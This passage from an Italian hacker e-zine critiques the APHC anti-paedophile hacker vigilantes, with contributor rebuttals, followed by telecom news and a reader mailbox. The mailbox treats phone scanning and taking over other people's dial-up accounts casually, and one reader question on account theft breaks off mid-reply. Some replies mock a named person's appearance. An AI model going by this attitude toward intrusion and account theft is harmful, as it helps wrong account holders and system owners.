Spirito di John Perry Barlow se ci sei batti un colpo. Evidentemente gli
"hacker" autori di questo comunicato vivono in un mondo tutto loro. Oramai
nessuno piu' crede alle favole del ciberspazio e i casi giudiziari dei quali
in molte occasioni ho parlato su queste pagine hanno chiaramente sgombrato il
campo da queste fandonie. La legge prevede una serie di criteri per
l'individuazione del locus commissi delicti e a - condizione di avere una
buona preparazione tecnica - non e' difficile risolvere buona parte dei
problemi teorici che si incontrano. Altro discorso e' quello dell'effettiva
perseguibilita' dei sospettati nel caso di reati commessi parzialmente
all'estero o di soggetti dimoranti all'esterno dei confini nazionali, ma i
problemi causati dall'estradizione non sono affatto ignoti al diritto penale e
non ci voleva di certo la Rete per farli emergere.

[ Favole del cyberspazio...
Ops. Guarda un po': proprio Barlow dice l'opposto. Mi sa tanto che qui ognuno
di noi abbia un piccolo mondo... troppo facile viverci dentro...
Ho sempre avuto una certa simpatia per Barlow e per i Grateful Dead eheheh.
Conosco i suoi discorsi come il padre nostro o quasi ed ecco cosa dice uno
dei grandi (trovabile sempre sul buon libro Cyberia a pag. 209): "Barlow
ammette che le parole e le LEGGI non possono mai definire adeguatamente una
cosa indefinibile come Cyberia: << STO CERCANDO DI COSTRUIRE CON DEI MATTONI,
UN MODELLO IN SCALA FUNZIONANTE DI UN BANCO DI NEBBIA. STO USANDO UN
MATERIALE DA COSTRUZIONE DEL TUTTO INADEGUATO A RAPPRESENTARE L'OGGETTO CHE
STO CERCANDO DI DESCRIVERE" >>. Ok, non lo dico per sputtanare, ma e' solo
che chi parla di Barlow forse non lo conosce profondamente quanto un deadhead
e usa le sue parole come strumento in situazioni non adeguate. Scusatemi se
sono un deadhead oltre ad un amante dell'informatica... Spero che Andrea
Monti mi rispetti come io rispetto lui; qui in Italia di hacking dal punto di
vista discorsivo (NB: non dico legislativo) forse manchiamo di gente come
Barlow e ce n'e' troppa di simile a Kapor, oltre a coloro che sono troppo
intenti per qualche disturbo psichico a non considerare hacker tutto cio'
che non e' se stesso (vedi articolo "I bei tempi sono finiti" di fusys
nell'xmas edition ;) o parla per 1 minuto in alcuni canali irc)...
Scusatemi, ma se non fosse per qualche gruppo di ragazzi che si impegna a
dare una svolta alla scena, beh sarebbe proprio uno schifo... E' facile
pubblicare un libro e far di questo un manualetto per idioti... Ora che
non buco sistemi, che non sono un hacker ve lo dico chiaramente...
Ad ogni modo voglio anche dare la definizione di EFF e se posso qui esprimere
il mio parere comincio ad avere dei dubbi sull'ALCEI se uno dei suoi membri
(giuro che quando leggevo non sapevo che lo fosse) se ne esce con questa
frase...
Barlow descrive le tattica apparentemente brutale da parte di agenti e
investigatori:
<< Non e' tanto uno sforzo pianificato e concentrato per sovvertire la
Costituzione, quanto quel processo naturale che interviene ogni qualvolta
c'e' gente ignorante e impaurita e quando sono in ballo questione ambigue
nei confronti dei diritti costituzionali >> tratto sempre da Cyberia dove
c'e' un "puntatore" a Mondo 2000, Inverno 1991, pagina 46 e sempre su Cyberia
nella stessa pagina (209) "La EFF spera di servire da ponte logico fra
utenti di computer e forze dell'ordine in modo che il ciberspazio possa
essere colonizzato in maniera piu' ordinata e antagonistica" anche se dopo
c'e' la prima frase che ho riportato all'inizio del commento e che guarda
caso pone dei dubbi sulla colonizzazione della Rete.
Voglio continuare a riportare un ultimo pezzo che spero possa far vedere la
Rete come una cosa non cosi' facile da giudicare e su cui non si puo' avere
la presunzione di avere una normativa vigente efficace. Qui non sono io che
parlo, ma e' quello che comunque credo: "E mentre persino i piu' illuminati
tra quanti stanno dando articolazione a Cyberia si trovano senza parole
quando debbono parlare della nuova frontiera, altri, meno informati pensano
di avere il diritto di dire l'ultima parola. Il bisogno dei media di
illustrare lo scenario hacker al grande pubblico ha ECCESSIVAMENTE
SEMPLIFICATO (e se bfi fosse in versione html avrei messo un gif solo
per queste parole) questi problemi e ci ha persino ALLONTANATO dalla loro
COMPRENSIONE."
Ah siii, ma certo: mentre in America si stanno ancora facendo seghe mentali
su come regolamentare una cosa che risulta cosi' difficile tratteggiare, noi
siamo qui ad avere la presunzione di parlare di leggi efficaci... Cazzo,
basta vedere in che mani siamo nella vita di tutti i giorni.
Ok mi si puo' dire che Cyberia e' stato scritto nel 1994, ma provate a
seguire qualkosa sulla WELL o a parlare con qualcuno della Bay Area sulla
situazione americana di oggi... ]  

"A tale dibattito noi non vogliamo partecipare, almeno in questa circostanza"

Ma cosa fare se ci si imbatte in una bambina di soli 8 anni che viene
brutalmente stuprata?

"Se cio' accadesse per strada, anche il piu' pacifista degli uomini
interverrebbe, e, forse, metterebbe a repentaglio la propria stessa vita per
salvarla. Se accadesse sulla prima pagina del Corriere della Sera o del New
York Time, probabilmente lo sdegno sarebbe generale. Se accade in Internet,
ma solo in Internet, i nemici della bambina divengono due: il pedofilo
stupratore e la liberta'. Cioe' la liberta' del pedofilo di stuprare in rete.
E la liberta' della bimba?"

A parte che non riesco ad immaginare come si possa stuprare qualcuno sulla
prima pagina del Corriere della Sera, (si stende il giornale per terra e poi
si fa attenzione a non uscire dal foglio di carta?), ancora piu' difficile
e' immaginare come lo si possa fare su Internet. Forse gli estensori di
questo documento, oramai prigionieri del "virtuale", hanno una scarsa
dimestichezza con le questioni fisiche... Al di la' della boutade,
l'affermazione grave e' quella secondo la quale la liberta' sarebbe nemica
della tutela dei minori, un ritornello che e' stato gia' suonato molte volte,
per esempio ai tempi del Communication Decency Act.

[ Mi ricordo che quando andavo alle superiori leggevo molto sulla
pedofilia, in quanto e' una di quelle tracce che escono sempre nei compiti
in classe. All'inizio il termine veniva usato non con accezione negativa,
ma solo per descrivere una persona amante dei bambini. Non c'era di mezzo
violenza e sesso. Poi... beh sapete qual'e' il poi... Ho solo una cosa da
dire. Premetto che non buco server da un bel po', ma mi rendo conto che la
pedofilia non si blocchi in questo modo... Credo che ci sia un po' di
differenza tra i guardoni e gli stupratori. I primi stanno anche su
Internet, i secondi sono quelli che fanno violenze e noi non ci possiamo
di certo armare di pistole e andare a sparare in giro per il mondo: non e'
cosa da fare ne' per un hacker ne' per un cittadino... Tutto quello che si
puo' fare e' denunciare la presenza di materiale osceno alle autorita'...
questo discorso non riguarda solo l'hacker, ma qualsiasi navigatore. Se noi
buttiamo giu' un servizio o facciamo di testa nostra rischiamo di fare in
modo che lo stupratore non sia mai beccato, al limite potremo prendere
colui che mette le immagini su internet, ma molte volte colui che offre un
servizio e scopre che un suo cliente o un estraneo mette on-line del
materiale osceno si guarda bene dal denunciarlo anche perche' ci va di mezzo
il suo nome...
E poi con le stronzate che scrivono i giornali e con quanto ne capisce la
massa va a finire che il poveretto gestore del servizio viene pure preso per
stupratore... Scusatemi, ma di stronzate sui giornali ne ho viste talmente
tante che mi guardo bene...
Ah non diciamo che gli hackers non hanno esperienze fisiche... probabilmente
non hai visto il sito hackingirl di nostro fratello sPIRIT ;)
Ecco qui un tipico esempio di come sia comodo considerarci degli automi. ]

"Ecco perche' ci siamo alleati con don Fortunato, perche' crediamo che
l'esercito dei difensori della liberta' della rete e, indirettamente, dei
pedofili fosse gia' fin troppo affolato..."

Bell'argomento... siccome non c'era posto da un lato, ci siamo buttati
sull'altro, complimenti! Bell'esercizio di democrazia e senso civico e' invece
affermare che la difesa della liberta' sia atto diretto a garantire la
commissione di reati. E' abbastanza banale notare che se non ci fosse questa
vituperata liberta' di espressione, bestialita' del genere (mi riferisco al
comunicato stampa) sarebbero state censurate ab ovo. Ma a differenza dei miei
contradditori, pur criticando ferocemente le posizioni, non mi sognerei mai di
invocare la loro riduzione al silenzio!

[ No Comment ]

"E' quella bambina che ci interessa (Freud avrebbe molto da dire in proposito)
e tentiamo di proteggerla non violando la legge ma sfruttando, questa volta a
nostro vantaggio, le molte lacune giuridiche che tuttora permangono e che ci
consentono buon margine di manovra."

Mi dispiace deludere questi signori, ma le "molte lacune giuridiche" alle quali
fanno riferimento non esistono, anzi grazie a loro abbiamo finalmente uno dei
primi casi di applicazione della legge sui reati informatici che prescinde dagli
scopi classici degli intrusori (curiosita', sfida e via discorrendo). Siamo in
presenza di atti al limite del terrorismo.

[ Ho risposto sopra, ma ti sembra cmq un sistema di leggi adeguato? ]

"E tuttavia ci siamo dati anche noi un codice etico:..."

Che notoriamente non costituisce una scusa: e' una questione di par condicio,
se vanno condannati quelli che accedono ad una macchina per il puro gusto di
farlo, identico trattamento dovrebbe essere riservato a questi tizi.
In ogni caso, per il codice penale tutto questo puo' rilevare ai fini della
configurazione di un'attenuante, non certo per escludere l'esistenza del reato.

[ Purtroppo e' la verita'... ]

"...quando facciamo chiudere un sito, noi non lo "distruggiamo", perche'
sarebbe stupido distruggere le prove del reato, e far chiudere un sito, senza
fare arrestare il proprietario; non serve proprio a nulla, in quanto se il
pedofilo ha le sue pagine Web, e le sue immagini su hard disk, bastano venti
minuti per aprire un nuovo sito."

Interessante. Mica non fanno danni perche' e' illegale... si astengono dal
provocarli solo perche' non serve a nulla, dal che si deduce che se ritenessero
necessario radere al suolo un server non si farebbero scrupoli.

[ Purtroppo la tentazione e' forte... io non so se resisterei a non
mettere una backdoor su quei sistemi... e' per questo che cerco di non far
hacking: e' una cosa piu' forte di me... La mia ragazza diceva che mi
dovevano tagliare le mani... ]

"Quando troviamo un sito per pedofili, noi semplicemente ci entriamo,
raccogliendo quante piu' informazioni possibili sul possessore, e le randiamo
note al responsabile della compagnia che ospita il sito incriminato, saranno
poi loro a passare tutte le informazioni da loro e da noi raccolte alle forze
dell'ordine competenti."

Il tutto in evidente violazione delle norme che puniscono l'accesso abusivo,
la detenzione e lo scambio di codici di accesso necessario per l'intrusione,
l'esercizio arbitrario delle proprie ragioni; e delle norme sulla tutela della
legge sui dati personali...

"Si precisa, che chiudere i siti per pedofili, non e' l'unico servizio offerto
dall'APHC infatti offriamo assistenza ai genitori, preoccupati della sicurezza
dei loro figli in Rete; e aiutiamo le famiglie di bambini gravemente ammalati
(attualmente ne stiamo aiutando due) pubblicizzando in modo massiccio le
informazioni riguardanti i loro bambini, in modo che il numero piu' alto dei
medici ne sia a conoscenza, e possa aiutare quelle famiglie."

Qui siamo al puro grottesco.

[ Voglio solo dire che molta gente vede Internet come uno strumento
tecnico e certe volte non si rende conto di quanto sia possibile fare con
esso... Capisco che non sono la persona adatta per fare questo tipo di
discorso visto che forse Internet e' o sara' la mia rovina =) ad ogni modo
le iniziative di solidarieta' funzionano! Il problema che Monti si pone e'
probabilmente se un hacker possa fare una cosa del genere... Se lo prendiamo
come persona la risposta e' si' ]

"Ma se involontariamente abbiamo violato qualche regola possiamo solo dire che
ci dispiace ma se questo puo' evitare che anche solo un bambino subisca delle
violenze, siamo pronti a rifarlo non una ma cento volte."

Il fatto che abbiano violato la legge mi sembra pacifico, che sappiano
perfettamente quali norme stavano violando (ancora una volta la storia delle
lacune normative), quindi questa giustificazione non richiesta mi pare al
quanto indicativa.

"Don Milani violo' la legge ma fu assolto anche perche' seppe spiegarne la
ragione. Egli disse: << in quanto alla loro vita di giovani sovrani domani, non
posso dire ai miei ragazzi che l'unico modo di amare la legge e' obbedirla.
Posso solo dire loro che essi dovranno tenere in tale onore le leggi degli
uomini da osservarle quando sono giuste (cioe' quando sono la forza del
debole).
Quando invece vedranno che non sono giuste (cioe' quando sanzionano il sopruso
del forte) essi dovranno battersi perche' siano cambiate>>.

Bello! Ho imparato qualcosa! Non sapevo che gli hacker, fra un Linux How-To e
uno schema elettrico si dilettassero pure di certe letture, dopo Confucio,
anche la Conferenza Episcopale entra nel computer!
Con questo non intendo mancare di rispetto alle convinzioni religiose di
nessuno ma in uno stato laico quale e' il nostro, non si puo' ritirare fuori
una costruzione teocratica volta ad affermare il primato della norma morale
su quella giuridica. Sono d'accordo che se una legge e' sbagliata si deva far
di tutto per farla cambiare, ma quando si sceglie questa strada comunque si e'
disposti a pagare di persona (come insegnano le iniziative promosse da Marco
Pannella sulle liberalizzazione delle droghe leggere). In ogni caso c'e' modo
e modo di ottenere l'abrogazione o la modifica di leggi vigenti o l'emanazione
di nuove: a Roma esiste una cosa che si chiama Parlamento, never heard about?

[ La Costituzione e' una cosa in continuo sviluppo...
Se non si lotta pero' col cazzo che si raggiungono risultati... Il problema
e' quanto ci impiega la gente a capire. Anche se potete pensare il contrario
vista la mia partecipazione alla guida di Slump ora che mi tratto bene
continuo ad ammirare gente come Pannella... Andrea Monti dice in
conclusione che non ci sono piu' i Pancho Villa di una volta... Beh pero'
secondo me c'e' tanta gente che lotta contro i mulini a vento perche' troppe
persone hanno merda nel cervello... E non mi riferisco a nessuno di questi
soggetti, parlarne e' gia' buono ma coloro che invece prendono tutto per
default beh e' forse ora che capiscano che un uomo puo' far la differenza e
se mi dite di no vuol dire che le uniche leggi che conoscete sono quelle per
cui la mattina quando vi alzate piove, la montagna e' fatta di pietra,
l'acqua e' liquida ecc... Insomma siamo noi che giudichiamo i nostri simili
non una saetta proveniente dall'Olimpo... i Pancho Villa saranno presi come
idioti se non si ha una certa tendenza mentale all'innovazione e ai problemi
che questa comporta...
Ah cmq credo che un hacker sia una persona come tante altre... Oh cristo
o si fa di loro dei miti oppure delle macchine. Anche se non mi considerate
un hacker va bene, non mi interessa, piuttosto e' un fatto che molta gente
mi ha detto che non sono niente senza un computer. Credetemi nessuno puo'
dire una cosa del genere a qualsiasi uomo... Ho altre passioni e conosco
anche hacker (o smanettoni a seconda di come volete chiamarli) che si
interessano di religione e filosofia; io stesso mi interesso anche di
psicocibernetica e vi consiglio un libro che forse cambiera' il modo di
vedere certe cose, provate a comprare "Psicocibernetica" di Maxwell Maltz
che con la cibernetica non centra un cazzo, ma forse apre un po' la mente
verso il prossimo. ]

"Vi sono bambini stuprati da cani, venduti all'asta come carne da macello
mentre il mondo si affanna a scandalizzarsi se un prete si allea con gli
hackers per cercare un rimedio ed invece non affila le armi a difesa
dell'infanzia."

Fatti che esistevano ben prima della diffusione della Rete ed e' assolumente
improprio associarli ad uno strumento tecnico che - come dimostrano le recenti
indagini di polizia, addirittua facilita (e mi ripeto) l'identificazione dei
soggetti agenti (a prescindere da cosa abbiamo fatto in concreto).

"I giovani rischiano di non capire"

E continueranno a non capire se i problemi sono posti in questi termini confusi
e deliranti.

[ Ho paura che scrivendo si faccia quello che si vuole.... (il senso lo
capirete se vi fermate a contare fino a 10)
BFi conta su qualche centinaio di lettori o forse piu': non importa. Se posso
esprimere la mia opinione, vince sempre chi ha piu' lettori, ma come diceva
un mio caro amico hacker (e sono sicuro che a lui non neghereste mai tale
definizione) "le infezioni culturali vanno avanti" :) ]

"C'e' un modo solo per uscire da questo macabro gioco di parole- dice ancora
DonMilani- avere il coraggio di dire ai giovani di potersene far scudo ne'
davanti agli uomini ne' davanti a Dio, che bisogna che si sentano ognuno
l'unico responsabile di tutto. A questo patto l'umanita' porta dire di aver
avuto in questo secolo un progresso morale parallelo e proporzionale al suo
progresso tecnico."

Se non ricordo male uno dei principi che regolano l'agire dei Gesuiti - 
un'ordine che dell'obbedienza ha fatto un modello di comportamento - e'
perhindeac cadaver.

"APHC (Anti-Pedo Hackers Crusade)
Il Presidente
Il Vicepresidente"

In Rete si trovano informazioni su molti gruppi hacker wanna-be, come The Black
Page o System Down e francamente non mi sono mai imbattuto in presidenti,
vicepresidenti, tesorieri, segretari ...

[ Beh la mia esperienza con BFi e' positiva perche' c'e' liberta' di
scrivere. Non c'e' gerarchia. Voi potete dire anche che la pedofilia e'
liberta'. Beh i sopravvissuti degli anni 60 dicono sempre liberta' si', ma
vivi e lascia vivere :) la pedofilia non e' liberta'! un bambino non puo'
decidere per se stesso.... quelle sono violenze !!! ]

Per i piu' curiosi questa e' la home page dei vigilantes:

http://members.xoom.com/AP_C/index.html

[ Rispettare e accettare e' diverso?
Giuro che quando ho scritto questo pezzo non sapevo che Andrea Monti aveva
partecipato alla stesura di "Spaghetti Hackers", ho espresso soltanto il mio
parere e le mie esperienze su quella parte che potevo, effettivamente avevo
sospettato che fosse un avvocato (conosco la categoria, visto le lettere
piene di stronzate che ricevevo da parte di un mio vicino... cristo, mi
scriveva che il suo cliente era stufo di sentire musica ad alto volume,
incitandomi a fare piu' piano fino a quando un giorno scopri' che abitavo
nell'altro condominio al piano terra e lui stava in quello accanto
all'ultimo piano (i due condomini erano separati tra di loro da piu' di
trenta metri e a parte questo lui stava dall'altra facciata)) e poi vengo a
sapere che e' pure membro dell'ALCEI (costringendomi a fare alcune
correzioni) chiedo scusa per la mia sincerita'... 
Per fortuna non tutti la pensano come me, oh cazzo dovrei imparare a farmi i
cazzi miei.
Ricordatevi... La liberta' non e' un pretesto per la violenza, comporta
(tra le altre cose) il rispetto degli altri, altrimenti perche' cazzo non
l'abbiamo ancora raggiunta?
Infine, se devo dare un giudizio all'APHC, personalmente non vi aderirei:
provo ancora "fiducia" per questo Sistema, pero' a questo punto rispetto e
accetto chi non lo fa. ]

pIGpEN

- VARiE -

Alcune news dall'Italia e dal mondo :
(fonti: "Corriere della Sera", "Il Giornale" e Radio)

[1] Tiscali offre accesso gratuito a Internet

Tiscali (fornitore di telefonia sardo) offrira' dal 15 febbraio accesso
gratuito a Internet, inizialmente solo a Milano, Roma e in Sardegna,
a partire da Maggio in tutta Italia.
Per accesso gratuito Tiscali intende senza abbonamento, in quanto otterra'
profitto dalle chiamate urbane effettuate.
Penso concorderete con me che era meglio il contrario =)

[2] Connessione a Internet attraverso la rete elettrica

Primi esperimenti a Milano ad opera della Citytel (controllata dalla AEM) di
connessione a Internet sfruttando la linea elettrica, utilizzando la 
tecnologia messa a punto dalla Nortel (compagnia telefonica canadese).
Citytel conta di diventare provider nel corso del 1999, e di fornire 
accesso a internet ai milanesi dietro pagamento di un canone e senza
spese di connessione (visto che non e' necessario telefonare e l'assorbimento
di energia elettrica e' trascurabile).
Si parla di velocita' nell'ordine delle 10-20 volte quelle dello squallido
collegamento via modem, mica male no?
Speriamo che questa tecnologia possa diventare accessibile anche nel resto
dell'Italia e a prezzi contenuti..

[3] Cambiano i numeri verdi!

Dal 1mo Febbraio la Telecom si allinea con gli stati nordamericani e con
molti europei cambiando il prefisso dei numeri verdi da 167 a 800.
I vecchi numeri verdi rimarranno accessibili sia colla vecchia che colla
nuova numerazione, mentre i nuovi numeri richiesti dalle aziende saranno
forniti solo con l'800.
Che dire, aggiornate i vostri wardialer ! =)))

[4] Telefonate gratuite in Germania

In Germania alcune nuove compagnie telefoniche hanno deciso di far
concorrenza all'ex-monopolista Deutsche Telekom, non come da noi facendo
battaglia sulle 5 lire MA fornendo telefonate GRATUITE dalle 19 di sera
in poi. Che dire, Paese che vai, l'Italia fa sempre cacare al confronto...

Cavallo


----------------------------------[ MAiLB0X ]---------------------------------
----------------------------------[ Cavallo ]---------------------------------

As usual, rieccomi a gestire la posta, siamo ormai arrivati a BFi5, secondo
anno di vita, noi siamo soddisfatti del nostro lavoro, voi sembrate
apprezzare l'e-zine, che altro dire, leggete le mail.
Nota:
Non so quale sia l'atteggiamento del lettore medio verso le mail (del tipo
"le salto che non me ne fotte un cazzo" o "che storia, arrivano le mail!")
io personalmente mi diverto a rispondere e penso che questo spazio tratti
sia argomenti tecnici (ma non troppo) sia cose piu' squisitamente filosofiche
e morali (miii che storia non ci posso credere, il mio argomento preferito!!).
Se devo dire una cosa (non prendetela come una bestemmia) sempre meglio delle
mail di Phrack dove nel 99% dei casi i lettori non ottengono una risposta ma
vengono presi per il culo.
Come dicono i Manic Street Preachers: This is my truth, tell me yours..

*************************************
[1] "Ma quali inferiori" da Charme

In Butchered 1 si dice che siamo inkazzati perche' siamo italiani. Ma
perche' cazzo avete creato due gruppi con nomi americani. Ma porca troia,
accusiamo gli altri di ritenerci inferiori e poi usiamo nomi
esterofili??? Ma cos'e', un sentimento di sudditanza inconscio???

[Sara' perche' l'inglese suona piu' cool? Sinceramente non zo, il mio nick
e' ITA ma avrebbe potuto essere ENG, i nomi dei gruppi (non so quali intendi,
s0ftpr0ject e Orda delle BadLands? Vabbe' che orda e' italiano) non li ho
scelti io, comunque se posso dire la mia (certo che posso) l'hack e tutto il
related (visto che un po' di inglese ci vuole ? =)) e' universale, Italia,
Usa o Germania non cambia, l'importante e' avere le palle.
Se abbiam detto che siamo inkazzati xche' siamo italiani e' xche' a maggior
ragione vivendo in questo paese di merda (diciamo dal punto di vista
politico-tecnologico) dobbiamo dimostrare le nostre doti e il nostro rifiuto
ancora di piu'!
Personalmente apprezzo l'America (parlo di USA e non dell'UK perche' non mi 
pare allo stesso livello tecnologico) per certi versi, ma per certi altri
penso sian dei gran coglioni, quindi non provo alcuna sudditanza.
Se proprio mi deve stare sul cazzo qualcuno scelgo i finlandesi (Dread gia'
lo sai  =)) anche se vanno apprezzati "cavalli" quali Linus T.]

NOMI ITALIANI AL 100%, CAZZO!!!

[MMM e' la liberta' personale dove la lasciamo? Il Free Speech?]

Noi abbiamo esportato nel mondo di tutto, si di tutto: mafia, puttane,
manodopera, guerra, intelligenza, premi nobel, scienziati, ciarlatani,
sport...

[Il brutto e' che molte cose (vedi scienziati) sono state veramente delle
"esportazioni" xche' in questo paese di merda (e due) non erano supportati
a dovere, quindi cosa fare se si e' dotati e intelligenti? Si va in un
paese dove cagano i soldi per far ricerca..
Cazz potrei far politica..mmm...naaaaah =)]

MA INFERIORI A CHI???

Io purtroppo di pirataggio non capisco un cazzo, ma sono con voi!!!
Continuate cosi', a nome di tutti coloro che nei meandri delle loro menti
malate sono con voi, (IO PER PRIMO) ma smettiamola con l'esterofilia. E
se in america col pirataggio sono avanti a noi, e' perche' hanno cominciato
prima. Ma tempo al tempo...

[Ma non so se hanno iniziato prima o dopo, comunque son cazzi loro, in Italia
come all'estero c'e' gente colle palle, il problema secondo me e' che da noi
c'e' un atteggiamento piu' votato al No-Spread delle info vista l'enorme
massa di lamah (del tipo che se uno sa qualcosa di veramente figo e'
difficile che ho lo riveli a tutti per paura che tale tecnica muoia).
Noi combattiamo questo atteggiamento con BFi, sperando di fornire un servizio
decente a tutti voi.
E poi vabbe' avanti a noi, c'e' da dire anche che noi siam 50 milioni e loro
piu' di 200 senza contare che se si parla di tecnologia la proporzione
aumenta ancora di piu'!!]

[2] "Ciao a tutti" by Stefano

<...>
Ora se mi permettete due cose sulla rivista:
1) Ma non state esagerando con Unix e derivati?
ok capisco che ancora oggi molti server soprattutto stranieri girano su
basi di questo OS , ma come una indagine di mercato afferma , piu' andremo
avanti col tempo e di piu' ci saranno server con Windows NT , quindi perche'
non aggiungete articoli su questo OS ?

[Stefano noi facciamo il possibile, c'e' da dire che la maggior parte
dei server decenti girano su *nix senza contare che su NT non ci sono
tutte le possibilita' di hack di uno unix, cque noi cerchiamo di fornirvi
qualcosa per tutti i sistemi, io personalmente ogni tanto propongo qualcosa
su Windows 95 (98) che pur non essendo l'OS principe di casa Microsoft per i
server e' usato in molti posti; come avrai spero visto su BFi4 e' iniziato
una specie di "minicorso" sull'hack e sui bug di NT5 (o Windows 2000 come
preferite) a cura di Dashie, spero questo ti soddisfi.]

2) Riguardo a quanto scritto nell'editoriale di BFi n3 , e' giusto quello
che dice l'autore ma e' anche vero che se #hackers.it aiuta uno newbie su
cento , be' quel canale e' utile , come scritto per quello che riguarda la
rivista : giusto come ragionamento ??

[Devo dirti che ti do ragione, anche io diciamo che ho iniziato li' (anche
se devo dire la verita' i miei primi contatti sono stati sull'ora defunto
#hackita), quantomeno ad entrare a contatto colla realta' italiana, anche se
io parlo dei bei tempi quando su #hackers.it girava gente quale PhoenYx,
|scacco|, zALTEC e altri amici di s0ftpj e dell'Orda, ora non so bene come
sia, diciamo che |scacco| ha ragione quando parla di livelli di lameraggine
quali trade di shellz e di grin in chan, per il resto son d'accordo con te,
se sono di aiuto ben vengano canali come quello, anche perche' poi la gente
se vuole se ne esce di li' ed entra in gruppi gia' esistenti, ne forma di
nuovi e cosi' via...]

[3] "??? BFI e' in ITAGLIANO ???"  by Vecna

Ciao a tutti.
Allora, dopo aver letto l'articolo di Sh4mp00 Sul BFI natalizio, mi chiedo
se il sistema che usa, non gli abbia negato il permesso di scrittura
OVUNQUE!

[??]

ma e' possibile cha ha fatto un periodo talmente sconfusionato in cui NON
SI CAPIVA REALMENTE UN CAZZO ;) ha messo + parentesi lui che tutte quelle
in un programma in C. Ha messo cosi' tanti "..." che se facciamo la somma
e li usiamo con un "cd" davanti, riusciamo a fare il giro di tutte le
directory del mondo in 80 giorni!

[Dehehe, vabbeh e' stile, cque Sh4mp00 e' una LEI ed e' pure la tipa
di |scacco| HIHIHI =)))]

Sh4mp00, non ho niente contro di te, ma si vede che la ragazza dell'hacker
ultrafiga che avevi descritto, ti ha fatto crashare l'ITALIANO.

[Non penso sia lesbica, anzi magari era lei che s'e' vista allo specchio =))]

A parer mio, la ragazza dell'hacker, semplicemente, trovera' sempre la
linea telefonica okkupata se telefona dopo le 18.30, o al sabato dopo
l'1.30 o alla domenica.

[Penso che lo sappia per esperienza personale =)]

O se l'hacker ha una dedicata, lo trovera' libero solo quando gli occhi
gli fanno le bollicine, e sono +  vacui di un tossico che si e' fumato i
propri escrementi (non e' interessante? perche Slump non lo prova :) ??

[non penso che lo Slump sia cosi' andato...]

Byte Byte & continuate alla grande.
un Analfabeta.

[Ok cque non ci pagano se scriviamo bene o male in italiano, e checcazz
mica abbiamo fatto tutti il Liceo Classico, poi la Scuola di Giornalismo e
poi l'esame statale di "Scrittore di E-Zine di Hacking" !! =))]

[4] "Sunrise Corporation" by Sunrise Corporation

Ciao, siamo dei lettori delle vostre due riviste, e volevamo informarvi

[Due?? Azz che mi sono perso una rivista? Aaaah forse intendete dei
primi due numeri, beh aggiornatevi che siamo al 5 =)]

che e' nato un nuovo sito internet: quello della SunRise Corporation.
Questa si occupa piu' o meno dei vostri stessi interessi, hacking,
phreaking e cracking. Il sito e':
Http://members.it.tripod.de/SunRise/index.html, ma ricordate di scrivere
la S e la R di SunRise maiuscole e tutto il resto minuscolo, causa un
problema tecnico del server.

[Problema tecnico del server??? HAHAHAHA ve l'hanno mai detto cari amici
SunRiserz che i webserver su Unix fanno distinzioni tra maiuscole e
minuscole? HIHIHIHI cosa mi tocca sentire..]

Se volete andate a dargli un'occhiata, e magari pubblicizzateci un po' per il
web. Fra i vari collegamenti c'e' anche quello al vostro sito, sperando che
possa essere reso disponibile al piu' presto. Grazie e a presto !

[Chi vuole andarci vada, il nostro sito e' disponibile da prima della vostra
e-mail ed e' http://softpj98.bbk.org ]

[5] "Edu il Coglione !" by Simone C.

Volevo innanzitutto salutare tutta la redazione di BFi congratulandovi per
la vostra zine, era ora che qualche cosa di serio usciva anche in italia.

[Grazie]

Volevo inoltre sfanculare tramite mail il Sig. EDU messo in bella mostra
su http://www.geocities.com/SiliconValley/Chip/3368/  .......e' proprio da
ricoverooo.. Porcoddio ma avete visto quanto cazzo e brutto???? Piu brutto
de 'npulmino mongoloidi, o de na disgrazia!!!

[HAHAHA Hai ragione !!]

Vi mando questo attach file con la foto del Mostro (con la M maiuscola)
perche sarebbe bello che venga messo nel prossimo BFi sotto una nuova
rubrica del tipo "Mostri e non solo.....Hacker...anche Hacher come dice
EDU lo stronzone..!!!.....A presto

[Se non ci sono stati disguidi dovrebbe essere incluso in questo numero di
BFi5, ora potete tutto vedere la Perversa Testa di Cazzo che ha pensato quella
serie IMMONDA di CACATE. (NDR: il file non e' stato allegato a questo numero
di BFi causa le sue eccessive dimensioni... nonche' per evitare di provocare
seri disturbi alla psiche di voi lettori.)
Grazie Simone sei un grande, ti saremo sempre debitori !!!!

[6] "phreaker" da KaOsS
[nota: penso proprio (e spero) che NON sia il Kaos che conosco io su IRC...]

vi mando un po' di cosine che vi possono fare comodo.Vorrei ricevere in
cambio shell o green con login e password.Ciao da KaOsS
Aspetto la vostra risposta.

[MA VAFFANCULO E' LA MIA RISPOSTA.
Ma DIO DELLE MAIL GRATUITE, COME CAZZO SI FA A MANDARMI 350k IN MAIL
CHE QUESTO ACCOUNT E' SU USA.NET E NON VA UN CAZZO !!!!
IO LO PAGO IL FOTTUTO TELEFONO DI MERDA !!!!!
Enucleo l'elenco delle "cosine" che mi hai mandato:
-Spaghetti phreak Cookbook: ZIOCANE E' IMMENSO E CE L'HO GIA' !!!
-due documenti di Anarchy: cazzo datati 1989, uno immenso e pure su roba che
 si trova bene o male ovunque
-una backdoor x *nix: non sara' il mio campo ma ce n'e' uno sfracelo in giro
Ora io dico, va bene voler dare una mano ma CAZZO almeno abbi il buon senso
di mandare una mail PRIMA chiedendo se ci interessino tali cose.
E poi mi vieni a chiedere shell o green? MA VAI A CAGARE VA !!!!
PS: Son gia' buono che non metto la tua mail x mandarti insulti da parte
di tutti i lettori...]

[7] "Scanning Telefonico" by Santa Claus

Hi BFi friends,
volevo innanzitutto farvi sapere che le vostre riviste sono una fonte di
spunti eccezionale, e farvi i miei complimenti per gli articoli contenuti.
Volevo chiedervi di mettere a volte anche degli articoli su cio' che
riguarda lo scanning dei numeri telefonici, (specie dei numeri verdi!),

[Beh non e' che ci siano grossi articoli da scrivere, si scanna, se trovi
qche numero lo provi, cerchi di capire di chi e', a cosa serve, a che tipo
di sistema ti connette, provi i metodi classici... finita qui =)]

infatti per questo argomento volevo farvi delle domande: - Quando trovo il
numero di un server (anche della mia citta') cosa devo fare? Collegarmi con
il modem, e poi? - Per le password e le userID, devo cercare di trovarle
da qualche parte in modo da fregare il collegamento a qualche povero
malcapitato? E se mi collego sotto il suo nome e password, mi possono in
qualche modo tracciare? (Tutto cio' solo per non pagare alcun abbonamento e
scroccare il collegamento a qualcuno!)

[Allora non ho capito bene il discorso, se intendi un numero verde (nella
tua citta'?!?) e' difficile trovare qualche malcapitato cui rubargli
l'account (a meno che sai di che servizio si tratti il grin e conosci
qualcuno cui zappare l'account).
Se invece intendi un abbonamento a Internet, per esempio un account
